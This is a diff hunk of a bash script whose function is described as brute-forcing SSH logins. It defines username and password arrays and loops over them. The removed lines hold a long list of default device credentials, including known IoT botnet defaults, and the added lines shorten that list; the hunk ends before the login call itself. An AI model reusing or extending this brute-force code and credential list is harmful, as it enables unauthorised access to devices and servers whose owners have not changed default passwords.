@@ -19,13 +19,13 @@ fi
 # brute force try to ssh into the machine main function
 sshTry()
 {
-	declare -a usernames=( "666666" "satya" "888888" "admin" "admin" "admin" "admin" "admin" "admin" "admin" "pi" "admin" "admin" "admin" "admin" "admin" "admin" "admin" "admin1" "administrator" "Administrator" "guest" "guest" "mother" "pi" "pi" "pi" "pi" "reddy" "root" "root" "root" "root" "root" "root" "root" "root" "root" "root" "root" "root" "root" "root" "root" "root" "root" "root" "root" "root" "root" "root" "root" "root" "root" "root" "root" "root" "root" "root" "root" "root" "service" "supervisor" "support" "tech" "ubnt" "user" "NA" )
-	declare -a passwords=( "666666" "satya" "888888" "" "1111" "1111111" "1234" "admin1234" "12345" "123456" "123456789" "54321" "7ujMko0admin" "admin" "meinsm" "pass" "password" "smcadmin" "password" "1234" "admin" "12345" "guest" "fucker" "root" "raspberry" "123456789" "" "admin1234" "" "00000000" "1111" "1234" "12345" "123456" "54321" "666666" "7ujMko0admin" "7ujMko0vizxv" "888888" "admin" "anko" "default" "dreambox" "hi3518" "ikwb" "juantech" "jvbzd" "klv123" "klv1234" "pass" "password" "realtek" "root" "system" "user" "vizxv" "xc3511" "xmhdipc" "zlxx." "Zte521" "service" "supervisor" "support" "tech" "ubnt" "user" "NA" )
+	declare -a usernames=( "666666" "satya" "888888" "admin" "admin" "admin" "admin" "admin" "admin" "admin" "pi" "NA" )
+	declare -a passwords=( "666666" "satya" "888888" "" "1111" "1111111" "1234" "admin1234" "12345" "123456" "123456789" "NA" )
 	
 	uname=""
 	pass=""
 
-	for i in {0..67};
+	for i in {0..11};
 	do
 		trap 'echo ""; echo"" ;echo "Skipped by the user"; echo"";echo "exiting this $1";return' INT
 		uname=${usernames[i]}
